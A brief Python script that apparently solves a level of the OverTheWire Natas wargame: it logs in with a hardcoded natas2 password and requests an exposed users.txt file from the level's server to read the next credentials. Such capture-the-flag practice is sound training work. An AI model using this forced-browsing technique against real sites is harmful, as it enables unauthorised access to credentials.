#!/usr/bin/env python
import requests

username = 'natas2'
password = 'h4ubbcXrWqsTo7GGnnUMLppXbOogfBZ7'

url = 'http://%s.natas.labs.overthewire.org/files/users.txt' % username

response = requests.get(url,auth=(username,password))

content = response.text
print(content)